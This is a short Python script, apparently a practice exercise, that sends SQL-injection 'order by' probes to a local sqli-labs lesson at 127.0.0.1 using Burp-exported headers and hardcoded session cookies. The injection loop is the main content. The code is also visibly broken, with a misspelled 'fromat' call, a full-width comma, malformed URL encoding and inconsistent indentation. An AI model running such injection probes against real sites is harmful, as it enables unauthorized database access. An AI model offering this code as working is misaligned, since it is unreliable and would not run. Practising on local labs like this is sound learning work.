import requests

session = requests.session()


for  a in range(0,4):
     for b in range(1, 3):
        print('is one {0} is two {1}.'.fromat(a, b ))

    burp0_url = "http://127.0.0.1:7080/Less-2/?id={0}%20order%20by%2{1}".format(a ，b)
    burp0_cookies = {"adminer_sid": "8c2a4648aa150763fdbacda199689675", "adminer_key": "b39fbb098bb90eb1c88c5c43a5f77ea5", "adminer_version": "0", "adminer_lang": "en"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close"}
     ret = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
      print (ret.content)   # 二进制显示网页内容
      print ("\n\n" )
